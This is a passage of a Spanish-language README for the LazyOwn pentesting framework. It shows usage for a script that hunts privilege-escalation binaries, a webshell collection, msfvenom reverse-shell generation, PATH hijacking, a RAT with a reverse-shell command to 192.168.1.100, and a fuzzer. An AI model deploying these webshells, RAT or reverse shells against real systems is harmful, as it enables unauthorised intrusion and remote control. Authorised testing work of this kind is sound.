<span id="cb14-35"><a href="#cb14-35" aria-hidden="true" tabindex="-1"></a><span class="st">        $directories = @(&quot;C:</span><span class="ch">\\</span><span class="st">Windows</span><span class="ch">\\</span><span class="st">System32&quot;, &quot;C:</span><span class="ch">\\</span><span class="st">&quot;, &quot;C:</span><span class="ch">\\</span><span class="st">Program Files&quot;, &quot;C:</span><span class="ch">\\</span><span class="st">Program Files (x86)&quot;)</span></span>
<span id="cb14-36"><a href="#cb14-36" aria-hidden="true" tabindex="-1"></a><span class="st">        foreach ($dir in $directories) {</span></span>
<span id="cb14-37"><a href="#cb14-37" aria-hidden="true" tabindex="-1"></a><span class="st">            Get-ChildItem -Path $dir -Recurse -Filter *.exe -ErrorAction SilentlyContinue | </span></span>
<span id="cb14-38"><a href="#cb14-38" aria-hidden="true" tabindex="-1"></a><span class="st">            ForEach-Object {</span></span>
<span id="cb14-39"><a href="#cb14-39" aria-hidden="true" tabindex="-1"></a><span class="st">                $acl = Get-Acl $_.FullName</span></span>
<span id="cb14-40"><a href="#cb14-40" aria-hidden="true" tabindex="-1"></a><span class="st">                $privileges = $acl.Access | Where-Object { $_.FileSystemRights -match &quot;FullControl&quot; }</span></span>
<span id="cb14-41"><a href="#cb14-41" aria-hidden="true" tabindex="-1"></a><span class="st">                if ($privileges) {</span></span>
<span id="cb14-42"><a href="#cb14-42" aria-hidden="true" tabindex="-1"></a><span class="st">                    Write-Output &quot;$($_.FullName)&quot;</span></span>
<span id="cb14-43"><a href="#cb14-43" aria-hidden="true" tabindex="-1"></a><span class="st">                }</span></span>
<span id="cb14-44"><a href="#cb14-44" aria-hidden="true" tabindex="-1"></a><span class="st">            }</span></span>
<span id="cb14-45"><a href="#cb14-45" aria-hidden="true" tabindex="-1"></a><span class="st">        }</span></span>
<span id="cb14-46"><a href="#cb14-46" aria-hidden="true" tabindex="-1"></a><span class="st">        &quot;&quot;&quot;</span></span>
<span id="cb14-47"><a href="#cb14-47" aria-hidden="true" tabindex="-1"></a>        </span>
<span id="cb14-48"><a href="#cb14-48" aria-hidden="true" tabindex="-1"></a>        <span class="co"># Ejecuta el script de PowerShell</span></span>
<span id="cb14-49"><a href="#cb14-49" aria-hidden="true" tabindex="-1"></a>        result <span class="op">=</span> subprocess.run([<span class="st">&#39;powershell&#39;</span>, <span class="st">&#39;-Command&#39;</span>, powershell_script], stdout<span class="op">=</span>subprocess.PIPE, stderr<span class="op">=</span>subprocess.PIPE, text<span class="op">=</span><span class="va">True</span>)</span>
<span id="cb14-50"><a href="#cb14-50" aria-hidden="true" tabindex="-1"></a>        output <span class="op">=</span> result.stdout</span>
<span id="cb14-51"><a href="#cb14-51" aria-hidden="true" tabindex="-1"></a>        </span>
<span id="cb14-52"><a href="#cb14-52" aria-hidden="true" tabindex="-1"></a>        <span class="co"># Extrae los binarios encontrados</span></span>
<span id="cb14-53"><a href="#cb14-53" aria-hidden="true" tabindex="-1"></a>        <span class="cf">for</span> line <span class="kw">in</span> output.split(<span class="st">&#39;</span><span class="ch">\n</span><span class="st">&#39;</span>):</span>
<span id="cb14-54"><a href="#cb14-54" aria-hidden="true" tabindex="-1"></a>            <span class="cf">if</span> line:</span>
<span id="cb14-55"><a href="#cb14-55" aria-hidden="true" tabindex="-1"></a>                binario <span class="op">=</span> os.path.basename(line.strip())</span>
<span id="cb14-56"><a href="#cb14-56" aria-hidden="true" tabindex="-1"></a>                binarios_encontrados.add(binario)</span>
<span id="cb14-57"><a href="#cb14-57" aria-hidden="true" tabindex="-1"></a>    </span>
<span id="cb14-58"><a href="#cb14-58" aria-hidden="true" tabindex="-1"></a>    <span class="co"># Filtra el DataFrame principal con los binarios encontrados</span></span>
<span id="cb14-59"><a href="#cb14-59" aria-hidden="true" tabindex="-1"></a>    df_binarios_encontrados <span class="op">=</span> df1[df1[<span class="st">&#39;Binary&#39;</span>].isin(binarios_encontrados)]</span>
<span id="cb14-60"><a href="#cb14-60" aria-hidden="true" tabindex="-1"></a>    </span>
<span id="cb14-61"><a href="#cb14-61" aria-hidden="true" tabindex="-1"></a>    <span class="co"># Genera un CSV con los detalles de los binarios encontrados</span></span>
<span id="cb14-62"><a href="#cb14-62" aria-hidden="true" tabindex="-1"></a>    <span class="cf">with</span> <span class="bu">open</span>(<span class="st">&#39;resultado.csv&#39;</span>, <span class="st">&#39;w&#39;</span>) <span class="im">as</span> f:</span>
<span id="cb14-63"><a href="#cb14-63" aria-hidden="true" tabindex="-1"></a>        <span class="cf">for</span> binario <span class="kw">in</span> binarios_encontrados:</span>
<span id="cb14-64"><a href="#cb14-64" aria-hidden="true" tabindex="-1"></a>            detalles <span class="op">=</span> df2[df2[<span class="st">&#39;Binary&#39;</span>] <span class="op">==</span> binario]</span>
<span id="cb14-65"><a href="#cb14-65" aria-hidden="true" tabindex="-1"></a>            <span class="cf">if</span> <span class="kw">not</span> detalles.empty:</span>
<span id="cb14-66"><a href="#cb14-66" aria-hidden="true" tabindex="-1"></a>                f.write(detalles.to_csv(index<span class="op">=</span><span class="va">False</span>, header<span class="op">=</span><span class="va">False</span>))</span>
<span id="cb14-67"><a href="#cb14-67" aria-hidden="true" tabindex="-1"></a>                <span class="bu">print</span>(detalles.to_csv(index<span class="op">=</span><span class="va">False</span>, header<span class="op">=</span><span class="va">False</span>))</span>
<span id="cb14-68"><a href="#cb14-68" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb14-69"><a href="#cb14-69" aria-hidden="true" tabindex="-1"></a><span class="co"># Función para ejecutar opciones basadas en los datos encontrados</span></span>
<span id="cb14-70"><a href="#cb14-70" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> ejecutar_opciones():</span>
<span id="cb14-71"><a href="#cb14-71" aria-hidden="true" tabindex="-1"></a>    df_resultado <span class="op">=</span> pd.read_csv(<span class="st">&#39;resultado.csv&#39;</span>, header<span class="op">=</span><span class="va">None</span>, names<span class="op">=</span>[<span class="st">&#39;Binary&#39;</span>, <span class="st">&#39;Function Name&#39;</span>, <span class="st">&#39;Function URL&#39;</span>, <span class="st">&#39;Description&#39;</span>, <span class="st">&#39;Example&#39;</span>])</span>
<span id="cb14-72"><a href="#cb14-72" aria-hidden="true" tabindex="-1"></a>    </span>
<span id="cb14-73"><a href="#cb14-73" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> binario <span class="kw">in</span> df_resultado[<span class="st">&#39;Binary&#39;</span>].unique():</span>
<span id="cb14-74"><a href="#cb14-74" aria-hidden="true" tabindex="-1"></a>        <span class="bu">print</span>(<span class="ss">f&quot;Binario encontrado: </span><span class="sc">{</span>binario<span class="sc">}</span><span class="ss">&quot;</span>)</span>
<span id="cb14-75"><a href="#cb14-75" aria-hidden="true" tabindex="-1"></a>        detalles <span class="op">=</span> df_resultado[df_resultado[<span class="st">&#39;Binary&#39;</span>] <span class="op">==</span> binario]</span>
<span id="cb14-76"><a href="#cb14-76" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb14-77"><a href="#cb14-77" aria-hidden="true" tabindex="-1"></a>        <span class="bu">print</span>(<span class="st">&quot;Opciones:&quot;</span>)</span>
<span id="cb14-78"><a href="#cb14-78" aria-hidden="true" tabindex="-1"></a>        <span class="cf">for</span> i, (_, row) <span class="kw">in</span> <span class="bu">enumerate</span>(detalles.iterrows(), start<span class="op">=</span><span class="dv">1</span>):</span>
<span id="cb14-79"><a href="#cb14-79" aria-hidden="true" tabindex="-1"></a>            <span class="bu">print</span>(<span class="ss">f&quot;</span><span class="sc">{</span>i<span class="sc">}</span><span class="ss">. </span><span class="sc">{</span>row[<span class="st">&#39;Function Name&#39;</span>]<span class="sc">}</span><span class="ss"> - </span><span class="sc">{</span>row[<span class="st">&#39;Description&#39;</span>]<span class="sc">}</span><span class="ss">&quot;</span>)</span>
<span id="cb14-80"><a href="#cb14-80" aria-hidden="true" tabindex="-1"></a>        <span class="bu">print</span>(<span class="ss">f&quot;</span><span class="sc">{</span>i<span class="op">+</span><span class="dv">1</span><span class="sc">}</span><span class="ss">. No hacer nada y salir&quot;</span>)</span>
<span id="cb14-81"><a href="#cb14-81" aria-hidden="true" tabindex="-1"></a>        </span>
<span id="cb14-82"><a href="#cb14-82" aria-hidden="true" tabindex="-1"></a>        <span class="cf">while</span> <span class="va">True</span>:</span>
<span id="cb14-83"><a href="#cb14-83" aria-hidden="true" tabindex="-1"></a>            opcion <span class="op">=</span> <span class="bu">input</span>(<span class="st">&quot;Seleccione una opción: &quot;</span>)</span>
<span id="cb14-84"><a href="#cb14-84" aria-hidden="true" tabindex="-1"></a>            <span class="cf">if</span> opcion.isdigit() <span class="kw">and</span> <span class="dv">1</span> <span class="op">&lt;=</span> <span class="bu">int</span>(opcion) <span class="op">&lt;=</span> <span class="bu">len</span>(detalles) <span class="op">+</span> <span class="dv">1</span>:</span>
<span id="cb14-85"><a href="#cb14-85" aria-hidden="true" tabindex="-1"></a>                <span class="cf">break</span></span>
<span id="cb14-86"><a href="#cb14-86" aria-hidden="true" tabindex="-1"></a>            <span class="cf">else</span>:</span>
<span id="cb14-87"><a href="#cb14-87" aria-hidden="true" tabindex="-1"></a>                <span class="bu">print</span>(<span class="st">&quot;Opción no válida. Por favor, intente de nuevo.&quot;</span>)</span>
<span id="cb14-88"><a href="#cb14-88" aria-hidden="true" tabindex="-1"></a>        </span>
<span id="cb14-89"><a href="#cb14-89" aria-hidden="true" tabindex="-1"></a>        opcion <span class="op">=</span> <span class="bu">int</span>(opcion)</span>
<span id="cb14-90"><a href="#cb14-90" aria-hidden="true" tabindex="-1"></a>        </span>
<span id="cb14-91"><a href="#cb14-91" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> opcion <span class="op">&lt;=</span> <span class="bu">len</span>(detalles):</span>
<span id="cb14-92"><a href="#cb14-92" aria-hidden="true" tabindex="-1"></a>            <span class="bu">print</span>(<span class="ss">f&quot;Ejecutando opción </span><span class="sc">{</span>opcion<span class="sc">}</span><span class="ss"> para </span><span class="sc">{</span>binario<span class="sc">}</span><span class="ss">&quot;</span>)</span>
<span id="cb14-93"><a href="#cb14-93" aria-hidden="true" tabindex="-1"></a>            <span class="co"># Código para ejecutar la opción correspondiente</span></span>
<span id="cb14-94"><a href="#cb14-94" aria-hidden="true" tabindex="-1"></a>            <span class="bu">print</span>(<span class="ss">f&quot;Ejemplo de ejecución:</span><span class="ch">\n</span><span class="sc">{</span>detalles<span class="sc">.</span>iloc[opcion<span class="op">-</span><span class="dv">1</span>][<span class="st">&#39;Example&#39;</span>]<span class="sc">}</span><span class="ss">&quot;</span>)</span>
<span id="cb14-95"><a href="#cb14-95" aria-hidden="true" tabindex="-1"></a>            <span class="co"># Aquí puedes agregar el código para ejecutar el ejemplo si es necesario</span></span>
<span id="cb14-96"><a href="#cb14-96" aria-hidden="true" tabindex="-1"></a>        <span class="cf">else</span>:</span>
<span id="cb14-97"><a href="#cb14-97" aria-hidden="true" tabindex="-1"></a>            <span class="bu">print</span>(<span class="st">&quot;Saliendo&quot;</span>)</span>
<span id="cb14-98"><a href="#cb14-98" aria-hidden="true" tabindex="-1"></a>            <span class="cf">break</span></span>
<span id="cb14-99"><a href="#cb14-99" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb14-100"><a href="#cb14-100" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="va">__name__</span> <span class="op">==</span> <span class="st">&#39;__main__&#39;</span>:</span>
<span id="cb14-101"><a href="#cb14-101" aria-hidden="true" tabindex="-1"></a>    buscar_binarios()</span>
<span id="cb14-102"><a href="#cb14-102" aria-hidden="true" tabindex="-1"></a>    ejecutar_opciones()</span></code></pre></div>
<h2 id="uso-modo-lazyown-webshells">Uso modo LazyOwn WebShells</h2>
<p>LazyOwn Webshell Collection es una colleccion de webshells para
nuestro framework, el cual nos permite mediante distintos lenguajes
establecer una webshell en la maquina donde ejecutemos lazyown webshell
basicamente lo que hace es levantar un servidor web dentro del
directorio modules para que así esté visible mediante el navegador así
podemos tanto disponivilizar los modulos por separados mediante web como
tambien podemos acceder al directorio cgi-bin en donde hay 4 shells una
bash otra en perl otra en python y en asp por si fuera un windwos</p>
<div class="sourceCode" id="cb15"><pre
class="sourceCode sh"><code class="sourceCode bash"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="ex">lazywebshell</span></span></code></pre></div>
<p>y listo ya podemos acceder a cualquiera de estas url:</p>
<p><a href="http://localhost:8080/cgi-bin/lazywebshell.sh"
class="uri">http://localhost:8080/cgi-bin/lazywebshell.sh</a></p>
<p><a href="http://localhost:8080/cgi-bin/lazywebshell.py"
class="uri">http://localhost:8080/cgi-bin/lazywebshell.py</a></p>
<p><a href="http://localhost:8080/cgi-bin/lazywebshell.asp"
class="uri">http://localhost:8080/cgi-bin/lazywebshell.asp</a></p>
<p><a href="http://localhost:8080/cgi-bin/lazywebshell.cgi"
class="uri">http://localhost:8080/cgi-bin/lazywebshell.cgi</a></p>
<figure>
<img
src="https://github.com/grisuno/LazyOwn/assets/1097185/fc0ea814-7044-4f8f-8979-02f9579e9df9"
alt="image" />
<figcaption aria-hidden="true">image</figcaption>
</figure>
<h2 id="uso-lazy-msfvenom-para-reverse-shell">Uso Lazy MSFVenom para
Reverse Shell</h2>
<p>se crearán 3 archivos uno para windows uno para linux y uno para mac
con el nombre shell.exe, shell.elf, shell.macho respectivamente y se
invoca con el comando run lazymsfvenom</p>
<div class="sourceCode" id="cb16"><pre
class="sourceCode sh"><code class="sourceCode bash"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="ex">run</span> lazymsfvenom</span></code></pre></div>
<h2 id="uso-lazy-path-hijacking">Uso Lazy PATH Hijacking</h2>
<p>se crearán un archivo en /tmp con el nombre de binary_name seteado en
payload inicializado con gzip en memoria y como bash en payload
parasetear el payload desde el json usar el comando payload para
ejecutar usar:</p>
<div class="sourceCode" id="cb17"><pre
class="sourceCode sh"><code class="sourceCode bash"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a><span class="ex">lazypathhijacking</span></span></code></pre></div>
<h2 id="uso-modo-lazyown-rat">Uso modo LazyOwn RAT</h2>
<p>LazyOwn RAT es una sencilla pero potente Remote Admin Tool Cuenta con
una funcion de Screenshot, el cual captura la pantalla del servidor,
tiene un comando upload, el cual nos permite subir archivos a la maquina
comprometida, y un modo C&amp;C donde podran enviar comandos al
servidor, cuenta con dos modos en modo cliente y modo servidor, no tiene
ningun tipo de ofuscación y la rat me base en BasicRat acá su github <a
href="https://github.com/awesome-security/basicRAT"
class="uri">https://github.com/awesome-security/basicRAT</a> y en <a
href="https://github.com/hash3liZer/SillyRAT"
class="uri">https://github.com/hash3liZer/SillyRAT</a> aun que está
ultima es mucho más completa yo solo queria sacar pantallasos subir
archivos y enviar comandos, quizas más adelante agregar funcionalidad de
mirar webcams, pero eso más adelante.</p>
<div class="sourceCode" id="cb18"><pre
class="sourceCode sh"><code class="sourceCode bash"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a><span class="ex">usage:</span> lazyownserver.py <span class="pp">[-</span><span class="ss">h</span><span class="pp">]</span> [--host HOST] [--port PORT] <span class="at">--key</span> KEY</span>
<span id="cb18-2"><a href="#cb18-2" aria-hidden="true" tabindex="-1"></a><span class="ex">lazyownserver.py:</span> error: the following arguments are required: <span class="at">--key</span></span>
<span id="cb18-3"><a href="#cb18-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb18-4"><a href="#cb18-4" aria-hidden="true" tabindex="-1"></a><span class="ex">usage:</span> lazyownclient.py <span class="pp">[-</span><span class="ss">h</span><span class="pp">]</span> <span class="at">--host</span> HOST <span class="at">--port</span> PORT <span class="at">--key</span> KEY</span>
<span id="cb18-5"><a href="#cb18-5" aria-hidden="true" tabindex="-1"></a><span class="ex">lazyownclient.py:</span> error: the following arguments are required: <span class="at">--host,</span> <span class="at">--port,</span> <span class="at">--key</span></span>
<span id="cb18-6"><a href="#cb18-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb18-7"><a href="#cb18-7" aria-hidden="true" tabindex="-1"></a><span class="ex">LazyOwn</span><span class="op">&gt;</span> run lazyownclient</span>
<span id="cb18-8"><a href="#cb18-8" aria-hidden="true" tabindex="-1"></a><span class="ex">[?]</span> lhost and lport and rat_key must be set</span>
<span id="cb18-9"><a href="#cb18-9" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb18-10"><a href="#cb18-10" aria-hidden="true" tabindex="-1"></a><span class="ex">LazyOwn</span><span class="op">&gt;</span> run lazyownserver</span>
<span id="cb18-11"><a href="#cb18-11" aria-hidden="true" tabindex="-1"></a><span class="ex">[?]</span> rhost and lport and rat_key must be set</span>
<span id="cb18-12"><a href="#cb18-12" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb18-13"><a href="#cb18-13" aria-hidden="true" tabindex="-1"></a><span class="ex">luego</span> los comandos son:</span>
<span id="cb18-14"><a href="#cb18-14" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb18-15"><a href="#cb18-15" aria-hidden="true" tabindex="-1"></a><span class="ex">upload</span> /path/to/file</span>
<span id="cb18-16"><a href="#cb18-16" aria-hidden="true" tabindex="-1"></a><span class="ex">donwload</span> /path/to/file</span>
<span id="cb18-17"><a href="#cb18-17" aria-hidden="true" tabindex="-1"></a><span class="ex">screenshot</span></span>
<span id="cb18-18"><a href="#cb18-18" aria-hidden="true" tabindex="-1"></a><span class="ex">sysinfo</span></span>
<span id="cb18-19"><a href="#cb18-19" aria-hidden="true" tabindex="-1"></a><span class="ex">fix_xauth</span> <span class="co">#to fix xauth xD</span></span>
<span id="cb18-20"><a href="#cb18-20" aria-hidden="true" tabindex="-1"></a><span class="ex">lazyownreverse</span> 192.168.1.100 8888 <span class="co">#Reverse shell to 192.168.1.100 on port 8888 ready to C&amp;C</span></span></code></pre></div>
<figure>
<img
src="https://github.com/grisuno/LazyOwn/assets/1097185/2bb7ec40-0d89-4ca6-87ff-2baa62781648"
alt="image" />
<figcaption aria-hidden="true">image</figcaption>
</figure>
<h2 id="uso-modo-lazy-meta-extract0r">Uso modo Lazy Meta Extract0r</h2>
<p>LazyMeta Extract0r es una herramienta diseñada para extraer metadata
de varios tipos de archivos, incluidos PDF, DOCX, archivos OLE (como DOC
y XLS), y varios formatos de imágenes (JPG, JPEG, TIFF). Esta
herramienta recorrerá un directorio especificado, buscará archivos con
extensiones compatibles, extraerá la metadata y la guardará en un
archivo de salida.</p>
<p>[*] Iniciando: LazyMeta extract0r [;,;]</p>
<p>usage: lazyown_metaextract0r.py [-h] –path PATH
lazyown_metaextract0r.py: error: the following arguments are required:
–path</p>
<div class="sourceCode" id="cb19"><pre
class="sourceCode sh"><code class="sourceCode bash"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a><span class="ex">python3</span> lazyown_metaextract0r.py <span class="at">--path</span> /home/user</span></code></pre></div>
<figure>
<img
src="https://github.com/grisuno/LazyOwn/assets/1097185/9ec77c01-4bc1-48ab-8c34-7457cff2f79f"
alt="image" />
<figcaption aria-hidden="true">image</figcaption>
</figure>
<h2 id="uso-modo-decrypt-encrypt">Uso modo decrypt encrypt</h2>
<p>un metodo de cifrado el cual nos permite tanto encryptar archivos
como decencriptar los si se cuenta con la llave obviamente:</p>
<figure>
<img
src="https://github.com/grisuno/LazyOwn/assets/1097185/15158dbd-6cd6-4e20-a237-6c89983d42ce"
alt="Captura de pantalla 2024-06-08 231900" />
<figcaption aria-hidden="true">Captura de pantalla 2024-06-08
231900</figcaption>
</figure>
<div class="sourceCode" id="cb20"><pre
class="sourceCode sh"><code class="sourceCode bash"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a><span class="ex">encrypt</span> path/to/file key <span class="co"># to encrypt</span></span>
<span id="cb20-2"><a href="#cb20-2" aria-hidden="true" tabindex="-1"></a><span class="ex">decrypt</span> path/to/file.enc key <span class="co">#to decrypt</span></span></code></pre></div>
<h2 id="uso-modo-lazynmap">Uso modo LazyNmap</h2>
<p>El uso Lazynmap nos proporciona un script automatizado de un target
en este caso 127.0.0.1 utilizando nmap el scipr requiere permisos de
administración mediante sudo. tambien tiene un modulo de net discovery
para saber que hay en el segmento de ip en el que te encuentras.</p>
<figure>
<img
src="https://github.com/grisuno/LazyOwn/assets/1097185/48a38836-6cf5-4676-bea8-063e0b5cf7ad"
alt="image" />
<figcaption aria-hidden="true">image</figcaption>
</figure>
<div class="sourceCode" id="cb21"><pre
class="sourceCode sh"><code class="sourceCode bash"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true" tabindex="-1"></a><span class="ex">./lazynmap.sh</span> <span class="at">-t</span> 127.0.0.1 </span></code></pre></div>
<h2
id="uso-modo-chat-generativo-por-consola-lazyown-gpt-one-liner-cli-assistant-y-researcher">Uso
modo Chat Generativo por Consola LazyOwn GPT One Liner CLI Assistant y
researcher</h2>
<p>¡Descubre la revolución en automatización de tareas de pentesting con
el LazyOwn GPT One Liner CLI Assistant! Este increíble script forma
parte de la suite de herramientas LazyOwn, diseñadas para hacer tu vida
como pentester más eficiente y productiva.</p>
<p>🚀 Principales Características:</p>
<p>Automatización Inteligente: Utiliza la potencia de Groq y modelos
avanzados de lenguaje natural para generar comandos precisos y
eficientes basados en tus necesidades específicas. Interfaz Amigable:
Con un simple prompt, el asistente genera y ejecuta scripts de una
línea, reduciendo drásticamente el tiempo y esfuerzo en la creación de
comandos complejos. Mejora Continua: Transforma y optimiza continuamente
su base de conocimientos para proporcionarte las mejores soluciones,
adaptándose a cada situación. Depuración Simplificada: Habilita el modo
debug para obtener información detallada de cada paso, facilitando la
identificación y corrección de errores. Integración Perfecta: Funciona
sin problemas con tu entorno de trabajo, aprovechando el poder de la API
de Groq para ofrecerte respuestas rápidas y precisas.</p>
<p>🔒 Seguridad y Control:</p>
<p>Manejo Seguro de Errores: Detecta y responde inteligentemente a
errores de ejecución, asegurando que siempre tengas el control total de
cada comando generado. Ejecución Controlada: Antes de ejecutar cualquier
comando, solicita tu confirmación, brindándote la tranquilidad de saber
exactamente qué se está ejecutando en tu sistema.</p>
<p>🌐 Configuración Sencilla:</p>
<p>Configura tu API key en segundos y comienza a disfrutar de todas las
ventajas que ofrece el LazyOwn GPT One Liner CLI Assistant. La guía de
inicio rápido está disponible para ayudarte a configurar y sacar el
máximo provecho de esta poderosa herramienta.</p>
<p>🎯 Ideal para Pentesters y Desarrolladores:</p>
<p>Optimiza tus Procesos: Simplifica y acelera la generación de comandos
en tus auditorías de seguridad. Aprendizaje Continuo: La base de
conocimientos se actualiza y mejora constantemente, proporcionándote
siempre las mejores prácticas y soluciones más recientes. Con el LazyOwn
GPT One Liner CLI Assistant, transforma tu forma de trabajar, haciéndola
más rápida, eficiente y segura. ¡No pierdas más tiempo en tareas
repetitivas y complejas, y enfócate en lo que realmente importa:
descubrir y solucionar vulnerabilidades!</p>
<p>¡Únete a la revolución del pentesting con LazyOwn y lleva tu
productividad al siguiente nivel!</p>
<p>[?] Uso: python lazygptcli.py –prompt “<tu prompt>” [–debug]</p>
<p>[?] Opciones: –prompt “El prompt para la tarea de programación
(requerido).” –debug, -d “Habilita el modo debug para mostrar mensajes
de depuración.” –transform “Transforma la base de conocimientos original
en una base mejorada usando Groq.”</p>
<p>[?] Asegúrate de configurar tu API key antes de ejecutar el script:
export GROQ_API_KEY=<tu_api_key> [-&gt;] visit: <a
href="https://console.groq.com/docs/quickstart"
class="uri">https://console.groq.com/docs/quickstart</a> not sponsored
link</p>
<p>Requisitos: Python 3.x Una API key válida de Groq Pasos para Obtener
la API Key de Groq: Visita Groq Console (<a
href="https://console.groq.com/docs/quickstart"
class="uri">https://console.groq.com/docs/quickstart</a>) para
registrarte y obtener una API key.</p>
<div class="sourceCode" id="cb22"><pre
class="sourceCode sh"><code class="sourceCode bash"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true" tabindex="-1"></a><span class="bu">export</span> <span class="va">GROQ_API_KEY</span><span class="op">=&lt;</span>tu_api_key<span class="op">&gt;</span></span>
<span id="cb22-2"><a href="#cb22-2" aria-hidden="true" tabindex="-1"></a><span class="ex">python3</span> lazygptcli.py <span class="at">--prompt</span> <span class="st">&quot;&lt;tu prompt&gt;&quot;</span> <span class="pp">[--</span><span class="ss">debug</span><span class="pp">]</span>          </span></code></pre></div>
<figure>
<img
src="https://github.com/grisuno/LazyOwn/assets/1097185/90a95c2a-48d3-4b02-8055-67656c1e71c9"
alt="image" />
<figcaption aria-hidden="true">image</figcaption>
</figure>
<h2 id="uso-de-modo-lazyown_bprfuzzer.py">Uso de modo
lazyown_bprfuzzer.py</h2>
<p>Proporcionar los argumentos según las solicitudes del script: El
script solicitará los siguientes argumentos: usage: lazyown_bprfuzzer.py
[-h] –url URL [–method METHOD] [–headers HEADERS] [–params PARAMS]
[–data DATA] [–json_data JSON_DATA] [–proxy_port PROXY_PORT] [-w
WORDLIST] [-hc HIDE_CODE]</p>
<p>lazyburp.py: error: the following arguments are required: –url –url:
La URL a la que se enviará la solicitud (obligatorio). –method: El
método HTTP a utilizar, como GET o POST (opcional, valor predeterminado:
GET). –headers: Los encabezados de la solicitud en formato JSON
(opcional, valor predeterminado: {}). –params: Los parámetros de la URL
en formato JSON (opcional, valor predeterminado: {}). –data: Los datos
del formulario en formato JSON (opcional, valor predeterminado: {}).
–json_data: Los datos JSON para la solicitud en formato JSON (opcional,
valor predeterminado: {}). –proxy_port: El puerto del proxy interno
(opcional, valor predeterminado: 8080). -w, –wordlist: La ruta del
diccionario para el modo de fuzzing (opcional). -hc, –hide_code: El
código de estado HTTP para ocultar en la salida (opcional).</p>
<div class="sourceCode" id="cb23"><pre
class="sourceCode sh"><code class="sourceCode bash"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true" tabindex="-1"></a><span class="ex">python3</span> lazyown_bprfuzzer.py <span class="at">--url</span> <span class="st">&quot;http://example.com&quot;</span> <span class="at">--method</span> POST <span class="at">--headers</span> <span class="st">&#39;{&quot;Content-Type&quot;: &quot;LAZYFUZZ&quot;}&#39;</span></span></code></pre></div>
<p>Forma 2: Uso Avanzado Si deseas aprovechar las características
avanzadas del script, como el modo de repetición o fuzzing, sigue estos
pasos:</p>
<p>Repetición de solicitudes:</p>
<p>Para utilizar la funcionalidad de repetición de solicitudes,
proporciona los argumentos como se indicó anteriormente. Durante la
ejecución, el script preguntará si deseas repetir la solicitud. Ingresa
‘s’ para repetir o ‘n’ para finalizar el repetidor. Fuzzing:</p>
<p>Para usar la funcionalidad de fuzzing, asegúrate de proporcionar un
diccionario de palabras con el argumento -w o –wordlist. El script
reemplazará la palabra LAZYFUZZ en la URL y otros datos con las palabras
del diccionario proporcionado. Durante la ejecución, el script mostrará
los resultados de cada iteración de fuzzing. Estas son las formas
básicas y avanzadas de usar el script lazyburp.py. Dependiendo de tus
necesidades, puedes elegir la forma que mejor se adapte a tu situación
específica.</p>
<div class="sourceCode" id="cb24"><pre
class="sourceCode sh"><code class="sourceCode bash"><span id="cb24-1"><a href="#cb24-1" aria-hidden="true" tabindex="-1"></a><span class="ex">python3</span> lazyown_bprfuzzer.py <span class="dt">\ </span>                                                                                                          ─╯</span>
<span id="cb24-2"><a href="#cb24-2" aria-hidden="true" tabindex="-1"></a>    <span class="ex">--url</span> <span class="st">&quot;http://127.0.0.1:80/LAZYFUZZ&quot;</span> <span class="dt">\</span></span>
<span id="cb24-3"><a href="#cb24-3" aria-hidden="true" tabindex="-1"></a>    <span class="at">--method</span> POST <span class="dt">\</span></span>
<span id="cb24-4"><a href="#cb24-4" aria-hidden="true" tabindex="-1"></a>    <span class="at">--headers</span> <span class="st">&#39;{&quot;User-Agent&quot;: &quot;LAZYFUZZ&quot;}&#39;</span> <span class="dt">\</span></span>
<span id="cb24-5"><a href="#cb24-5" aria-hidden="true" tabindex="-1"></a>    <span class="at">--params</span> <span class="st">&#39;{&quot;param1&quot;: &quot;value1&quot;, &quot;param2&quot;: &quot;LAZYFUZZ&quot;}&#39;</span> <span class="dt">\</span></span>
<span id="cb24-6"><a href="#cb24-6" aria-hidden="true" tabindex="-1"></a>    <span class="at">--data</span> <span class="st">&#39;{&quot;key1&quot;: &quot;LAZYFUZZ&quot;, &quot;key2&quot;: &quot;value2&quot;}&#39;</span> <span class="dt">\</span></span>
<span id="cb24-7"><a href="#cb24-7" aria-hidden="true" tabindex="-1"></a>    <span class="at">--json_data</span> <span class="st">&#39;{&quot;key3&quot;: &quot;LAZYFUZZ&quot;}&#39;</span> <span class="dt">\</span></span>
<span id="cb24-8"><a href="#cb24-8" aria-hidden="true" tabindex="-1"></a>    <span class="at">--proxy_port</span> 8080 <span class="dt">\</span></span>
<span id="cb24-9"><a href="#cb24-9" aria-hidden="true" tabindex="-1"></a>    <span class="at">-w</span> /usr/share/seclist/SecLists-master/Discovery/Variables/awesome-environment-variable-names.txt <span class="dt">\</span></span>
<span id="cb24-10"><a href="#cb24-10" aria-hidden="true" tabindex="-1"></a>    <span class="at">-hc</span> 501</span></code></pre></div>
<div class="sourceCode" id="cb25"><pre
class="sourceCode sh"><code class="sourceCode bash"><span id="cb25-1"><a href="#cb25-1" aria-hidden="true" tabindex="-1"></a><span class="ex">python3</span> lazyown_bprfuzzer.py <span class="dt">\ </span>                                                                                                          ─╯</span>
<span id="cb25-2"><a href="#cb25-2" aria-hidden="true" tabindex="-1"></a>    <span class="ex">--url</span> <span class="st">&quot;http://127.0.0.1:80/LAZYFUZZ&quot;</span> <span class="dt">\</span></span>
<span id="cb25-3"><a href="#cb25-3" aria-hidden="true" tabindex="-1"></a>    <span class="at">--method</span> POST <span class="dt">\</span></span>
